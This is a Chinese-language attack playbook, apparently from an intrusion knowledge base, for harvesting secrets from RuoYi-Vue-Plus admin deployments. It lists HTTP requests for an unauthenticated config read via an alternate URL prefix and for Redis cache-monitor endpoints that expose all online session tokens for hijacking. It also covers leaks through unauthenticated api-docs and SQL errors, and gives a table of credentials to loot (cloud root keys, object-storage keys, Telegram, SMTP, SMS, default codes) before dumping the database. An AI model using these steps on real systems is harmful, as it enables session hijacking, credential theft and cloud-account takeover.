# 若依-Vue-Plus 密钥面:一张 sys_config ≈ 整条下潜链

> 登录后台后**不要直接拖业务表**。先扫这一层:后台能读到的配置与缓存里,通常同时躺着 DB、对象存储、云账号、短信商、邮件、TG bot 的全部凭据。
> 全部实测于 RuoYi-Vue-Plus 4.8.2 + `com.ruoyi.facebook.*` 二开模块。

## 1. 未授权配置读取(路由粒度漏配)

```bash
GET /prod-api/system/config/configKey/{key}    # 401 要鉴权
GET /prod-api/system/config/front/{key}        # 200 匿名可读 ← 同一个 controller,另一个前缀
```

读出内容示例:`sys.user.initPassword=123456`、`captchaEnabled=true`、`registerUser=false`、业务开关与阈值。

**通用教训**:鉴权是按 controller 方法逐个加的 → 同一个 config 模块换个 URL 前缀就绕过了。凡是 `front/` / `open/` / `public/` / `anon/` / `api/` 前缀都要单独试一遍。

## 2. 缓存监控 = 任意 Redis 命名空间读(会话 + 全部密钥)

```bash
GET /prod-api/monitor/cache/getKeys/{redisNs}         # 列出该命名空间全部 key
GET /prod-api/monitor/cache/getValue/{redisNs}/{key}  # 取单个值
GET /prod-api/monitor/online/list                     # 在线会话列表(带来源 IP)
```

- `online_tokens:*` → **枚举全部在线会话令牌**,可直接顶会话,**不依赖口令**(口令改了这条路还在)
- `sys_config` 命名空间 → 明文凭据:云 AK/SK、MinIO AK/SK、`telegram.bot.token`、`mail.password`、短信商 pwd、汇率 API key、Google auth secret、USDT 收款地址…
- `/monitor/online/list` 的来源 IP 是**运营位置情报**(实测覆盖老挝/伊朗/成都/AWS HK),用于判断"谁在运营、此刻有没有人在线")

## 3. 未授权接口文档与报错回显

```bash
GET /v3/api-docs                          # 328 路径 / 374 操作 / 201 schema,未授权可读 → 端点全集
GET /actuator/health                      # 200(仅 health;env/heapdump 常已关)
GET /system/user/list?orderByColumn=id    # → Unknown column 'id',泄露 SQL/表名
# tab_text 之类参数 → 泄露 com.ruoyi.xxx.controller.XxxController(包名即二开模块命名空间)
```

api-docs 里还能看到**仍在生产启用的 demo 模块**(测试 Excel / 分布式锁 / 限流 / 国际化),以及作者 demo 账号 —— 都是可打面。

## 4. 凭据清单(用来判"我手上现在有什么")

| 键 / 位置 | 价值 |
|---|---|
| `tencent.translate.secret.id/key` | 名义是翻译服务密钥,**实测是云账号 Root AK/SK** → 见 `cloud-credential-leak-exploitation/references/tencent-root-ak.md` |
| `sys_oss_config`(表) | MinIO/S3 AK/SK + endpoint + bucket + domain |
| `telegram.bot.token` | 全量接管 TG 推送 bot |
| `mail.*` / 短信商凭据 | SMTP 与短信通道 → 验证码轰炸且按量计费 |
| `*.initPassword` / `*.default.verify.code` | 默认口令与**默认验证码**(可直接接管新注册账号) |
| `fb.min/max.withdraw.amount` 等阈值 | 业务闭环阈值(能不能自己走完一遍业务) |

> 会话与密钥随时可能因对方应急响应被轮换 → **先把密钥面拉全,再谈拖库**。
